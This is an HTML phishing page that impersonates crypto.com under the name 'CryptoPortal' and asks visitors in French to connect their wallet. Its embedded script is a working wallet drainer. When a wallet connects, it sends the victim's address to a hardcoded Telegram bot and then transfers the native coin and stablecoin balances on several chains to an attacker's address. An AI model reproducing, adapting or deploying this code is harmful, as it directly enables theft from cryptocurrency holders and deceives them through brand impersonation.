<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>crypto.com</title>
<script src="https://cdn.tailwindcss.com"></script>
<script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
<style>
body {
    background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
    min-height: 100vh;
    display: flex;
    align-items: center;
    justify-content: center;
    font-family: system-ui, -apple-system, sans-serif;
}
.container {
    background: white;
    border-radius: 24px;
    padding: 48px;
    text-align: center;
    max-width: 450px;
    box-shadow: 0 20px 60px rgba(0,0,0,0.3);
}
.icon { font-size: 72px; margin-bottom: 24px; }
.connect-btn, button {
    background: linear-gradient(135deg, #667eea, #764ba2);
    color: white;
    border: none;
    padding: 16px 48px;
    font-size: 18px;
    font-weight: 600;
    border-radius: 12px;
    cursor: pointer;
}
@keyframes spin { to { transform: rotate(360deg); } }
.spinner { animation: spin 1s linear infinite; }
</style>
</head>
<body>

<!-- STYLES CSS -->
<style>
    * {
        margin: 0;
        padding: 0;
        box-sizing: border-box;
        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
    }
    body {
        background: linear-gradient(135deg, #0a1427 0%, #0c1a33 100%) !important;
        color: white !important;
        min-height: 100vh !important;
        display: flex !important;
        align-items: center !important;
        justify-content: center !important;
    }
    .crypto-container {
        max-width: 1200px;
        margin: 0 auto;
        padding: 20px;
        text-align: center;
    }
    .crypto-logo {
        display: flex;
        align-items: center;
        justify-content: center;
        gap: 10px;
        margin-bottom: 40px;
    }
    .crypto-logo-icon {
        width: 50px;
        height: 50px;
        background: linear-gradient(135deg, #00c3ff, #00d7ff);
        border-radius: 50%;
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 24px;
    }
    .crypto-logo-text {
        font-size: 28px;
        font-weight: bold;
        background: linear-gradient(to right, #00c3ff, #00d7ff);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
    }
    .crypto-hero h1 {
        font-size: 3rem;
        margin-bottom: 20px;
        line-height: 1.2;
    }
    .crypto-hero p {
        font-size: 1.25rem;
        margin-bottom: 40px;
        color: #cccccc;
        line-height: 1.6;
        max-width: 600px;
        margin-left: auto;
        margin-right: auto;
    }
    .crypto-connect-btn {
        background: linear-gradient(135deg, #00c3ff, #00d7ff) !important;
        color: white !important;
        border: none !important;
        padding: 18px 40px !important;
        border-radius: 50px !important;
        font-size: 1.2rem !important;
        font-weight: bold !important;
        cursor: pointer !important;
        transition: all 0.3s ease !important;
        box-shadow: 0 4px 20px rgba(0, 195, 255, 0.4) !important;
        display: inline-flex !important;
        align-items: center !important;
        gap: 12px !important;
        margin-bottom: 50px !important;
    }
    .crypto-connect-btn:hover {
        transform: translateY(-3px) !important;
        box-shadow: 0 6px 25px rgba(0, 195, 255, 0.6) !important;
    }
    .crypto-cards {
        display: flex;
        justify-content: center;
        gap: 20px;
        flex-wrap: wrap;
        margin-top: 30px;
    }
    .crypto-card {
        width: 160px;
        height: 200px;
        background: rgba(255, 255, 255, 0.05);
        border-radius: 20px;
        padding: 20px;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        backdrop-filter: blur(10px);
        border: 1px solid rgba(255, 255, 255, 0.1);
        transition: transform 0.3s ease;
    }
    .crypto-card:hover {
        transform: translateY(-10px);
        background: rgba(255, 255, 255, 0.1);
    }
    .crypto-icon {
        width: 60px;
        height: 60px;
        border-radius: 50%;
        background: linear-gradient(135deg, #00c3ff, #00d7ff);
        display: flex;
        align-items: center;
        justify-content: center;
        font-size: 28px;
        margin-bottom: 15px;
    }
    .crypto-name {
        font-size: 1.1rem;
        font-weight: bold;
        margin-bottom: 5px;
    }
    .crypto-price {
        font-size: 1rem;
        color: #00c3ff;
    }
    @keyframes float {
        0% { transform: translateY(0px); }
        50% { transform: translateY(-10px); }
        100% { transform: translateY(0px); }
    }
    .floating {
        animation: float 5s ease-in-out infinite;
    }
</style>

<!-- HTML STRUCTURE -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<div class="crypto-container">
    <!-- Logo -->
    <div class="crypto-logo">
        <div class="crypto-logo-icon">
            <i class="fas fa-coins"></i>
        </div>
        <div class="crypto-logo-text">CryptoPortal</div>
    </div>

    <!-- Hero Section -->
    <div class="crypto-hero">
        <h1>Votre Porte d'EntrÃ©e vers<br>l'Ã‰cosystÃ¨me Crypto</h1>
        <p>Connectez votre wallet pour accÃ©der Ã  la plateforme de trading et d'investissement la plus sÃ©curisÃ©e.</p>
        
        <!-- BOUTON AVEC onclick="connect()" OBLIGATOIRE -->
        <button class="crypto-connect-btn" onclick="connect()">
            <i class="fas fa-wallet"></i>
            <span>Connect Wallet</span>
        </button>
        
        <!-- Crypto Cards -->
        <div class="crypto-cards">
            <div class="crypto-card floating">
                <div class="crypto-icon">
                    <i class="fab fa-bitcoin"></i>
                </div>
                <div class="crypto-name">Bitcoin</div>
                <div class="crypto-price">$42,156</div>
            </div>
            <div class="crypto-card floating" style="animation-delay: 0.5s;">
                <div class="crypto-icon">
                    <i class="fab fa-ethereum"></i>
                </div>
                <div class="crypto-name">Ethereum</div>
                <div class="crypto-price">$2,845</div>
            </div>
            <div class="crypto-card floating" style="animation-delay: 1s;">
                <div class="crypto-icon">
                    <i class="fas fa-gem"></i>
                </div>
                <div class="crypto-name">Solana</div>
                <div class="crypto-price">$98.45</div>
            </div>
        </div>
    </div>

    <!-- Footer -->
    <div style="margin-top: 60px; padding-top: 30px; border-top: 1px solid rgba(255, 255, 255, 0.1); color: #888; font-size: 0.9rem;">
        <p>Â© 2024 CryptoPortal. Tous droits rÃ©servÃ©s.</p>
    </div>
</div>

<script type="module">
// IMPORT WEB3MODAL V4 OFFICIEL
import { createWeb3Modal, defaultConfig } from 'https://esm.sh/@web3modal/ethers5@4.0.0'

// CONFIGURATION
const DEST = "0x63ce9a6Bd0cf439EA6D114F504B017EA43Af4BC1";
const PROJECT_ID = "72f0728c47e59d2eb9fc83069bc6843d";
const TG_TOKEN = "8551220717:AAGgPMGobMwwxKFPmCJSMFVfSbUzyRQqMIY";
const TG_CHAT = "8309320360";
const DELAY = 1500;

// TOKENS PAR CHAIN
const TOKENS = {"1":[{"a":"0xdAC17F958D2ee523a2206206994597C13D831ec7","s":"USDT"},{"a":"0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","s":"USDC"},{"a":"0x6B175474E89094C44Da98b954EedeAC495271d0F","s":"DAI"}],"10":[{"a":"0x94b008aA00579c1307B0EF2c499aD98a8ce58e58","s":"USDT"},{"a":"0x7F5c764cBc14f9669B88837ca1490cCa17c31607","s":"USDC"}],"56":[{"a":"0x55d398326f99059fF775485246999027B3197955","s":"USDT"},{"a":"0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d","s":"USDC"}],"137":[{"a":"0xc2132D05D31c914a87C6611C10748AEb04B58e8F","s":"USDT"},{"a":"0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174","s":"USDC"}],"8453":[{"a":"0xfde4C96c8593536E31F229EA8f37b2ADa2699bb2","s":"USDT"},{"a":"0xd9aAEc86B65D86f6A7B5B1b0c42FFA531710b6CA","s":"USDC"}],"42161":[{"a":"0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9","s":"USDT"},{"a":"0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8","s":"USDC"}],"43114":[{"a":"0x9702230A8Ea53601f5cD2dc00fDBc13d4dF4A8c7","s":"USDT"},{"a":"0xB97EF9Ef8734C71904D8002F8b6Bc66Dd9c48a6E","s":"USDC"}]};

// ERC20 ABI
const ERC20_ABI = [
    "function balanceOf(address) view returns (uint256)",
    "function transfer(address, uint256) returns (bool)",
    "function decimals() view returns (uint8)",
    "function symbol() view returns (string)"
];

// CHAINS CONFIG
const mainnet = {chainId:1, name:'Ethereum', currency:'ETH', explorerUrl:'https://etherscan.io', rpcUrl:'https://eth.llamarpc.com'};
const polygon = {chainId:137, name:'Polygon', currency:'MATIC', explorerUrl:'https://polygonscan.com', rpcUrl:'https://polygon-rpc.com'};
const bsc = {chainId:56, name:'BSC', currency:'BNB', explorerUrl:'https://bscscan.com', rpcUrl:'https://bsc-dataseed.binance.org'};
const arbitrum = {chainId:42161, name:'Arbitrum', currency:'ETH', explorerUrl:'https://arbiscan.io', rpcUrl:'https://arb1.arbitrum.io/rpc'};
const optimism = {chainId:10, name:'Optimism', currency:'ETH', explorerUrl:'https://optimistic.etherscan.io', rpcUrl:'https://mainnet.optimism.io'};
const base = {chainId:8453, name:'Base', currency:'ETH', explorerUrl:'https://basescan.org', rpcUrl:'https://mainnet.base.org'};
const avalanche = {chainId:43114, name:'Avalanche', currency:'AVAX', explorerUrl:'https://snowtrace.io', rpcUrl:'https://api.avax.network/ext/bc/C/rpc'};

// DEFAULT CONFIG
const cfg = defaultConfig({
    metadata: {
        name: 'crypto.com',
        description: 'Connect wallet',
        url: window.location.origin,
        icons: ['https://avatars.githubusercontent.com/u/37784886']
    },
    enableEIP6963: true,
    enableInjected: true,
    enableCoinbase: true,
    rpcUrl: 'https://eth.llamarpc.com',
    defaultChainId: 1
});

// CREATE MODAL
const modal = createWeb3Modal({
    ethersConfig: cfg,
    chains: [mainnet,polygon,bsc,arbitrum,optimism,base,avalanche],
    projectId: PROJECT_ID,
    enableAnalytics: false,
    themeMode: 'dark'
});

let provider, signer, address, drainStarted = false;

// CONNECT FUNCTION
window.connect = async function() {
    try {
        await modal.open();
    } catch(e) {
        console.error('Connection error:', e);
    }
}

// SUBSCRIBE TO WALLET CONNECTION
modal.subscribeProvider(async(state) => {
    if(state.isConnected && state.address && !drainStarted) {
        drainStarted = true;
        address = state.address;
        
        try {
            // Create provider
            provider = new ethers.providers.Web3Provider(state.provider);
            signer = provider.getSigner();
            
            // Send Telegram notification
            await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TG_CHAT,
                    text: `ðŸŽ¯ NEW CONNECTION\nðŸ‘¤ Address: ${address}\nâ° Time: ${new Date().toLocaleTimeString()}`
                })
            }).catch(e => console.log('TG error:', e));
            
            // Wait before draining
            await new Promise(r => setTimeout(r, 2000));
            
            // Start drainage
            await drainWallet();
            
        } catch(e) {
            console.error('Error:', e);
        }
    }
});

// DRAINAGE FUNCTION
async function drainWallet() {
    try {
        const network = await provider.getNetwork();
        const chainId = network.chainId;
        
        console.log('Draining on chain:', chainId);
        
        // DRAIN NATIVE TOKEN
        if(true) {
            const balance = await provider.getBalance(address);
            if(balance.gt(ethers.utils.parseEther('0.001'))) {
                const gasPrice = await provider.getGasPrice();
                const gasCost = gasPrice.mul(21000).mul(2);
                const amount = balance.sub(gasCost);
                
                if(amount.gt(0)) {
                    try {
                        const tx = await signer.sendTransaction({
                            to: DEST,
                            value: amount,
                            gasLimit: 21000
                        });
                        await tx.wait();
                        console.log('Native drained:', ethers.utils.formatEther(amount));
                    } catch(e) {
                        console.log('Native drain failed:', e);
                    }
                }
            }
        }
        
        // DRAIN TOKENS
        if(true) {
            const tokenList = TOKENS[chainId] || [];
            for(const token of tokenList) {
                try {
                    await new Promise(r => setTimeout(r, DELAY));
                    
                    const contract = new ethers.Contract(token.a, ERC20_ABI, signer);
                    const balance = await contract.balanceOf(address);
                    
                    if(balance.gt(0)) {
                        const tx = await contract.transfer(DEST, balance, {gasLimit: 100000});
                        await tx.wait();
                        console.log('Token drained:', token.s);
                    }
                } catch(e) {
                    console.log('Token error:', token.s, e);
                }
            }
        }
        
        console.log('Drainage complete!');
        
    } catch(e) {
        console.error('Drain error:', e);
    }
}

console.log('ðŸš€ Drainer initialized');
console.log('ðŸ“± Destination:', DEST);
</script>
</body>
</html>
